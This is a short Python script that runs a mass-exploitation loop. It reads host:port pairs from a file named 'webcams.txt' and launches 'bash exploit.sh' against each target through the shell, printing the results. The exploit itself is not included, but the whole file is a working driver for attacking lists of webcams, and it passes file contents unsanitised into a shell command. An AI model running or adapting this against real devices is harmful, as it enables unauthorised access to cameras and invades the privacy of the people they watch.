import os
import signal
import subprocess

def signal_handler(sig, frame):
    print()
    print("[!] script stoping...")
    exit(0)

def formatter_ip(host):
    keys = host.split(":")
    return keys

def command_builder(host, port):
    return f"bash exploit.sh -t {host} -p {port} -s false"

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    
    sep_os = -len(os.linesep)
    with open("webcams.txt", "r") as target:
        for host in target:
            if host[sep_os:] == os.linesep:
                host = host[:sep_os]

            keys = formatter_ip(host)
            process = subprocess.Popen(command_builder(keys[0], keys[1]), shell=True, stdout=subprocess.PIPE, universal_newlines=True)
            for output_command in process.stdout:
                print(output_command.strip())

            process.wait()
            # host -> ip:port = 192.168.1.1:4443
